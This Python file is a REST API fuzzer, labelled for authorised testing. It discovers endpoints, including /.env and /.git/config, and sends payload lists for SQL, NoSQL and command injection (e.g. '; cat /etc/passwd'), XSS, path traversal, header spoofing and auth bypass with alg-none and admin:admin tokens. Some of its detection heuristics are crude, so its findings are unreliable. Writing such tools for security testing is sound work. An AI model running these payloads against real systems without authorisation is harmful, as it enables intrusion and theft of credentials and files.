#!/usr/bin/env python3
"""
Advanced REST API Fuzzer for Security Testing
For authorized security testing only
"""
import requests
import sys
import json
import time
import random
import string
import hashlib
import itertools
from urllib.parse import urlparse, urljoin
from collections import defaultdict

class RESTAPIFuzzer:
    def __init__(self, base_url, config=None):
        self.base_url = base_url
        self.config = config or {}
        
        # Default configuration
        self.headers = self.config.get('headers', {
            'User-Agent': 'API-Fuzzer/1.0',
            'Content-Type': 'application/json'
        })
        self.auth_token = self.config.get('auth_token', None)
        self.timeout = self.config.get('timeout', 10)
        self.delay = self.config.get('delay', 0.1)
        self.threads = self.config.get('threads', 3)
        
        if self.auth_token:
            self.headers['Authorization'] = f'Bearer {self.auth_token}'
        
        self.session = requests.Session()
        self.session.headers.update(self.headers)
        
        # Results storage
        self.results = {
            'vulnerabilities': [],
            'endpoints': [],
            'errors': [],
            'responses': []
        }
        
        # Fuzzing payloads
        self.payloads = {
            'sql_injection': [
                "' OR '1'='1",
                "' OR 1=1--",
                "admin' --",
                "' UNION SELECT NULL--",
                "1' AND '1'='1",
                "' OR '1'='1' #",
                "' OR 1=1#",
                "admin'/*",
                "' OR 1=1 LIMIT 1--",
                "1' ORDER BY 1--"
            ],
            
            'xss': [
                '<script>alert(1)</script>',
                '<img src=x onerror=alert(1)>',
                '"><script>alert(1)</script>',
                '<svg/onload=alert(1)>',
                'javascript:alert(1)',
                '<body onload=alert(1)>',
                '"><img src=x onerror=alert(1)>'
            ],
            
            'command_injection': [
                '; ls -la',
                '| ls -la',
                '`ls -la`',
                '$(ls -la)',
                '; cat /etc/passwd',
                '| cat /etc/passwd',
                '& dir',
                '&& dir',
                '|| dir'
            ],
            
            'path_traversal': [
                '../../../etc/passwd',
                '..\\..\\..\\windows\\win.ini',
                '....//....//....//etc/passwd',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
                '..%252f..%252f..%252fetc%252fpasswd'
            ],
            
            'special_chars': [
                '\x00',           # Null byte
                '\x1a',           # Substitute
                '\n',             # Newline
                '\r',             # Carriage return
                '\t',             # Tab
                '\\',             # Backslash
                '%00',            # URL encoded null
                '{}',             # Empty JSON
                '[]',             # Empty array
                '{"$gt": ""}',    # MongoDB injection
                '{$ne: null}',    # NoSQL injection
                'undefined',
                'NaN',
                'Infinity'
            ],
            
            'numeric_fuzzing': [
                -1,
                0,
                1,
                999999999,
                -999999999,
                1.7976931348623157e+308,  # Max float
                -1.7976931348623157e+308,
                3.14159,
                "1e309",  # Overflow
                "0.1e1"
            ],
            
            'string_fuzzing': [
                '',                           # Empty string
                'A' * 1,                      # Single char
                'A' * 1000,                   # Long string
                'A' * 100000,                 # Very long string
                '😀🎉❤️',                     # Unicode
                'ａｂｃ',                    # Full-width chars
                'test%00extra',               # Null byte injection
                'true',                       # Boolean string
                'false',
                'null',
                'admin',
                'administrator',
                'test@test.com',
                '+1 (555) 123-4567'
            ],
            
            'json_fuzzing': [
                '{"__proto__": {"admin": true}}',
                '{"constructor": {"prototype": {"admin": true}}}',
                '{"$where": "1==1"}',
                '{"$regex": ".*"}',
                '{"$exists": true}',
                '{"$ne": null}',
                '{"$gt": ""}',
                '{"$set": {"role": "admin"}}',
                '{"$unset": ["password"]}'
            ],
            
            'header_injection': [
                {'X-Forwarded-For': '127.0.0.1'},
                {'X-Forwarded-Host': 'evil.com'},
                {'X-Original-URL': '/admin'},
                {'X-Rewrite-URL': '/admin'},
                {'X-HTTP-Method-Override': 'PUT'},
                {'X-HTTP-Method': 'DELETE'},
                {'Content-Type': 'application/xml'},
                {'Accept': 'application/xml'}
            ]
        }
        
        # Common API endpoints to test
        self.common_endpoints = [
            '/api',
            '/api/v1',
            '/api/v2',
            '/api/users',
            '/api/admin',
            '/api/auth',
            '/api/login',
            '/api/register',
            '/api/data',
            '/api/config',
            '/api/health',
            '/api/status',
            '/api/info',
            '/graphql',
            '/swagger.json',
            '/openapi.json',
            '/docs',
            '/api-docs',
            '/.env',
            '/config',
            '/debug',
            '/admin',
            '/backup',
            '/wp-json',
            '/.git/config'
        ]

    def discover_endpoints(self):
        """Discover API endpoints"""
        print("[*] Discovering API endpoints...")
        
        endpoints = []
        
        # Test common endpoints
        for endpoint in self.common_endpoints:
            url = urljoin(self.base_url, endpoint)
            try:
                response = self.session.get(url, timeout=self.timeout)
                
                if response.status_code != 404:
                    print(f"[+] Found: {url} ({response.status_code})")
                    endpoints.append({
                        'url': url,
                        'method': 'GET',
                        'status': response.status_code,
                        'content_type': response.headers.get('Content-Type', ''),
                        'content_length': len(response.content)
                    })
                    
                    # Check for API documentation
                    if 'swagger' in response.text.lower() or 'openapi' in response.text.lower():
                        print(f"[!] API documentation found: {url}")
                        self.results['vulnerabilities'].append({
                            'type': 'api_documentation_exposure',
                            'url': url,
                            'severity': 'Medium'
                        })
                    
                    # Check for sensitive files
                    if '.env' in url or '.git' in url:
                        print(f"[!] Sensitive file exposed: {url}")
                        self.results['vulnerabilities'].append({
                            'type': 'sensitive_file_exposure',
                            'url': url,
                            'severity': 'Critical'
                        })
                
                time.sleep(self.delay)
                
            except Exception as e:
                continue
        
        self.results['endpoints'] = endpoints
        return endpoints

    def fuzz_parameter(self, endpoint, method, param_name, original_value, payloads):
        """Fuzz a single parameter with various payloads"""
        vulnerabilities = []
        
        for category, payload_list in payloads.items():
            for payload in payload_list:
                try:
                    # Construct request with payload
                    if method == 'GET':
                        params = {param_name: payload}
                        response = self.session.get(endpoint, params=params, timeout=self.timeout)
                    elif method == 'POST':
                        data = {param_name: payload}
                        response = self.session.post(endpoint, json=data, timeout=self.timeout)
                    elif method == 'PUT':
                        data = {param_name: payload}
                        response = self.session.put(endpoint, json=data, timeout=self.timeout)
                    else:
                        continue
                    
                    # Analyze response
                    result = self.analyze_response(response, category, payload, param_name)
                    
                    if result:
                        vulnerabilities.append(result)
                        print(f"[+] {category.upper()} vulnerability found!")
                        print(f"    Endpoint: {endpoint}")
                        print(f"    Parameter: {param_name}")
                        print(f"    Payload: {str(payload)[:100]}")
                        print(f"    Severity: {result['severity']}")
                    
                    time.sleep(self.delay)
                    
                except requests.exceptions.Timeout:
                    vulnerabilities.append({
                        'type': f'{category}_timeout',
                        'parameter': param_name,
                        'payload': str(payload)[:100],
                        'severity': 'Low',
                        'description': 'Request timeout - potential DoS'
                    })
                except Exception as e:
                    continue
        
        return vulnerabilities

    def analyze_response(self, response, category, payload, param_name):
        """Analyze response for vulnerability indicators"""
        result = None
        
        # SQL Injection indicators
        if category == 'sql_injection':
            sql_errors = [
                'SQL syntax', 'mysql_fetch', 'ORA-', 'PostgreSQL',
                'SQLite', 'unclosed quotation', 'syntax error',
                'SQL command not properly ended'
            ]
            
            if response.status_code == 500:
                response_text = response.text.lower()
                if any(error.lower() in response_text for error in sql_errors):
                    result = {
                        'type': 'sql_injection',
                        'parameter': param_name,
                        'payload': str(payload)[:100],
                        'severity': 'Critical',
                        'evidence': response_text[:200]
                    }
            
            # Blind SQL injection detection
            if response.status_code == 200 and category == 'sql_injection':
                if 'error' in response.text.lower():
                    result = {
                        'type': 'blind_sql_injection',
                        'parameter': param_name,
                        'payload': str(payload)[:100],
                        'severity': 'High'
                    }
        
        # XSS indicators
        elif category == 'xss':
            if payload in response.text:
                result = {
                    'type': 'reflected_xss',
                    'parameter': param_name,
                    'payload': str(payload)[:100],
                    'severity': 'High',
                    'evidence': 'Payload reflected in response'
                }
        
        # Command injection indicators
        elif category == 'command_injection':
            command_outputs = ['root:', 'bin:', 'daemon:', 'Directory of', 'Volume in drive']
            response_text = response.text.lower()
            
            if any(output.lower() in response_text for output in command_outputs):
                result = {
                    'type': 'command_injection',
                    'parameter': param_name,
                    'payload': str(payload)[:100],
                    'severity': 'Critical',
                    'evidence': response_text[:200]
                }
        
        # Path traversal indicators
        elif category == 'path_traversal':
            if 'root:' in response.text or '[extensions]' in response.text:
                result = {
                    'type': 'path_traversal',
                    'parameter': param_name,
                    'payload': str(payload)[:100],
                    'severity': 'Critical',
                    'evidence': response.text[:200]
                }
        
        # General error analysis
        if response.status_code >= 500:
            if not result:
                result = {
                    'type': 'server_error',
                    'parameter': param_name,
                    'payload': str(payload)[:100],
                    'severity': 'Medium',
                    'evidence': f'Status: {response.status_code}'
                }
        
        # Information disclosure
        if response.status_code == 200:
            sensitive_patterns = ['password', 'token', 'secret', 'api_key', 'admin']
            response_text = response.text.lower()
            
            if any(pattern in response_text for pattern in sensitive_patterns):
                if not result:
                    result = {
                        'type': 'information_disclosure',
                        'parameter': param_name,
                        'payload': str(payload)[:100],
                        'severity': 'Medium',
                        'description': 'Sensitive information in response'
                    }
        
        return result

    def fuzz_endpoint(self, endpoint_info):
        """Fuzz a single endpoint"""
        print(f"\n[*] Fuzzing: {endpoint_info['url']}")
        
        vulnerabilities = []
        
        # Test different HTTP methods
        methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS']
        
        for method in methods:
            try:
                if method == 'GET':
                    response = self.session.get(endpoint_info['url'], timeout=self.timeout)
                elif method == 'POST':
                    response = self.session.post(endpoint_info['url'], json={}, timeout=self.timeout)
                elif method == 'PUT':
                    response = self.session.put(endpoint_info['url'], json={}, timeout=self.timeout)
                elif method == 'DELETE':
                    response = self.session.delete(endpoint_info['url'], timeout=self.timeout)
                elif method == 'PATCH':
                    response = self.session.patch(endpoint_info['url'], json={}, timeout=self.timeout)
                elif method == 'OPTIONS':
                    response = self.session.options(endpoint_info['url'], timeout=self.timeout)
                
                # Check for method override
                if response.status_code == 200:
                    print(f"  [{method}] {response.status_code}")
                    
                    # Try to parse JSON response
                    try:
                        data = response.json()
                        if isinstance(data, dict):
                            for key in data.keys():
                                vulnerabilities.extend(
                                    self.fuzz_parameter(
                                        endpoint_info['url'], method, key, data[key], self.payloads
                                    )
                                )
                    except:
                        pass
                
                time.sleep(self.delay)
                
            except Exception as e:
                continue
        
        return vulnerabilities

    def fuzz_authentication(self):
        """Test authentication bypass techniques"""
        print("[*] Testing authentication bypass...")
        vulnerabilities = []
        
        # Test without authentication
        try:
            response = self.session.get(self.base_url, timeout=self.timeout)
            if response.status_code == 200:
                print("[+] No authentication required!")
                vulnerabilities.append({
                    'type': 'missing_authentication',
                    'url': self.base_url,
                    'severity': 'Critical'
                })
        except:
            pass
        
        # Test with various tokens
        fake_tokens = [
            'Bearer invalid_token',
            'Bearer eyJhbGciOiJub25lIn0',
            'Bearer null',
            'Basic YWRtaW46YWRtaW4=',  # admin:admin
            'Basic dGVzdDp0ZXN0',      # test:test
            'Bearer 1',
            'Bearer true',
            'Token 1234567890'
        ]
        
        for token in fake_tokens:
            try:
                headers = self.headers.copy()
                headers['Authorization'] = token
                response = self.session.get(self.base_url, headers=headers, timeout=self.timeout)
                
                if response.status_code != 401 and response.status_code != 403:
                    print(f"[+] Authentication bypass possible: {token}")
                    vulnerabilities.append({
                        'type': 'authentication_bypass',
                        'token': token,
                        'status': response.status_code,
                        'severity': 'Critical'
                    })
                    break
            except:
                continue
        
        return vulnerabilities

    def fuzz_rate_limiting(self):
        """Test rate limiting"""
        print("[*] Testing rate limiting...")
        vulnerabilities = []
        
        requests_count = 50
        success_count = 0
        
        for i in range(requests_count):
            try:
                response = self.session.get(self.base_url, timeout=self.timeout)
                
                if response.status_code == 200:
                    success_count += 1
                
                if response.status_code == 429:  # Too Many Requests
                    print(f"[*] Rate limiting detected after {i+1} requests")
                    break
                
                time.sleep(0.05)  # Fast requests
                
            except Exception as e:
                continue
        
        if success_count == requests_count:
            print(f"[!] No rate limiting detected ({requests_count} requests succeeded)")
            vulnerabilities.append({
                'type': 'missing_rate_limiting',
                'requests': requests_count,
                'severity': 'Medium'
            })
        
        return vulnerabilities

    def fuzz_content_negotiation(self):
        """Test content negotiation attacks"""
        print("[*] Testing content negotiation...")
        vulnerabilities = []
        
        content_types = [
            'application/json',
            'application/xml',
            'text/xml',
            'application/x-www-form-urlencoded',
            'multipart/form-data',
            'text/html',
            'text/plain'
        ]
        
        for ct in content_types:
            try:
                headers = self.headers.copy()
                headers['Content-Type'] = ct
                headers['Accept'] = ct
                
                response = self.session.get(self.base_url, headers=headers, timeout=self.timeout)
                
                if response.status_code == 200:
                    if ct != 'application/json':
                        print(f"[+] Content type accepted: {ct}")
                        vulnerabilities.append({
                            'type': 'content_type_bypass',
                            'content_type': ct,
                            'severity': 'Low'
                        })
            except:
                continue
        
        return vulnerabilities

    def generate_report(self):
        """Generate fuzzing report"""
        print("\n[*] Generating fuzzing report...")
        
        # Sort vulnerabilities by severity
        severity_order = {'Critical': 0, 'High': 1, 'Medium': 2, 'Low': 3}
        sorted_vulns = sorted(
            self.results['vulnerabilities'],
            key=lambda x: severity_order.get(x.get('severity', 'Low'), 4)
        )
        
        report = {
            'target': self.base_url,
            'endpoints_discovered': len(self.results['endpoints']),
            'vulnerabilities_found': len(sorted_vulns),
            'vulnerabilities': sorted_vulns,
            'errors': self.results['errors'][:50],
            'summary': {
                'critical': len([v for v in sorted_vulns if v.get('severity') == 'Critical']),
                'high': len([v for v in sorted_vulns if v.get('severity') == 'High']),
                'medium': len([v for v in sorted_vulns if v.get('severity') == 'Medium']),
                'low': len([v for v in sorted_vulns if v.get('severity') == 'Low'])
            }
        }
        
        # Save detailed report
        with open('api_fuzzer_report.json', 'w') as f:
            json.dump(report, f, indent=2)
        
        # Print summary
        self.print_summary(report)
        
        return report

    def print_summary(self, report):
        """Print fuzzing summary"""
        print("\n" + "="*60)
        print("API FUZZING REPORT SUMMARY")
        print("="*60)
        print(f"Target: {report['target']}")
        print(f"Endpoints Discovered: {report['endpoints_discovered']}")
        print(f"Vulnerabilities Found: {report['vulnerabilities_found']}")
        print("\nSeverity Breakdown:")
        print(f"  Critical: {report['summary']['critical']}")
        print(f"  High: {report['summary']['high']}")
        print(f"  Medium: {report['summary']['medium']}")
        print(f"  Low: {report['summary']['low']}")
        
        if report['vulnerabilities']:
            print("\n[!] Top Vulnerabilities:")
            for vuln in report['vulnerabilities'][:5]:
                print(f"  - {vuln['type']}: {vuln.get('description', '')} ({vuln['severity']})")
        
        print("\n[!] Detailed report saved to api_fuzzer_report.json")

    def start_fuzzing(self):
        """Start the API fuzzing process"""
        print(f"[*] Starting API fuzzing of {self.base_url}")
        print(f"[*] Timeout: {self.timeout}s, Delay: {self.delay}s")
        
        # Discover endpoints
        endpoints = self.discover_endpoints()
        
        if not endpoints:
            print("[-] No endpoints discovered. Trying common patterns...")
            # Create synthetic endpoints for fuzzing
            endpoints = [{'url': self.base_url, 'method': 'GET'}]
        
        print(f"\n[*] Fuzzing {len(endpoints)} endpoints...")
        
        # Test authentication
        self.results['vulnerabilities'].extend(self.fuzz_authentication())
        
        # Test rate limiting
        self.results['vulnerabilities'].extend(self.fuzz_rate_limiting())
        
        # Test content negotiation
        self.results['vulnerabilities'].extend(self.fuzz_content_negotiation())
        
        # Fuzz each endpoint
        for endpoint in endpoints[:10]:  # Limit to first 10 endpoints
            vulns = self.fuzz_endpoint(endpoint)
            self.results['vulnerabilities'].extend(vulns)
        
        # Generate report
        return self.generate_report()

def main():
    if len(sys.argv) < 2:
        print("Usage: python rest_api_fuzzer.py <URL> [options]")
        print("\nOptions:")
        print("  --token <token>     Bearer token for authentication")
        print("  --delay <n>         Delay between requests in seconds (default: 0.1)")
        print("  --timeout <n>       Request timeout in seconds (default: 10)")
        print("\nExample:")
        print("  python rest_api_fuzzer.py https://api.example.com")
        print("  python rest_api_fuzzer.py https://api.example.com --token eyJhbGciOi...")
        sys.exit(1)
    
    url = sys.argv[1]
    
    # Parse options
    config = {
        'delay': 0.1,
        'timeout': 10
    }
    
    args = sys.argv[2:]
    for i, arg in enumerate(args):
        if arg == '--token' and i + 1 < len(args):
            config['auth_token'] = args[i + 1]
        elif arg == '--delay' and i + 1 < len(args):
            config['delay'] = float(args[i + 1])
        elif arg == '--timeout' and i + 1 < len(args):
            config['timeout'] = int(args[i + 1])
    
    print("[!] WARNING: Only use on systems you own or have explicit permission to test!")
    
    fuzzer = RESTAPIFuzzer(url, config)
    fuzzer.start_fuzzing()

if __name__ == "__main__":
    main()
